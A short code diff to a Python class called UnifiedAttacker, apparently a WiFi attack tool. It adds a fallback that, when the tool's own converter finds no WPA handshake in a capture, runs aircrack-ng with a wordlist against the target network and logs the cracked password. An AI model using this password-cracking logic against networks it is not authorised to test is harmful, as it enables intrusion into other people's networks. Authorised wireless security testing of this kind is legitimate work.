@@ -775,6 +775,18 @@ class UnifiedAttacker:
         ok, msg = convert_pcap_to_hc22000(cap_file, hash_file)
         self._log(msg, "success" if ok else "warn")
         if not ok:
+            # Python converter found no EAPOL/handshake — try aircrack-ng's
+            # parser directly on the raw pcap as a fallback (it may detect
+            # partial handshakes that our converter misses).
+            if check_tool("aircrack-ng") and self.wordlist and not self._stop.is_set():
+                self._log("Trying aircrack-ng directly on capture file...", "info")
+                ok3, _, key = aircrack.crack_wpa(
+                    cap_file, self.wordlist,
+                    bssid=self.target.bssid, ssid=self.target.ssid,
+                )
+                if key:
+                    self._log(f"Handshake cracked (aircrack) -- password: {key}", "success")
+                    return key
             return None
 
         has_hs, _ = aircrack.check_handshake(cap_file)
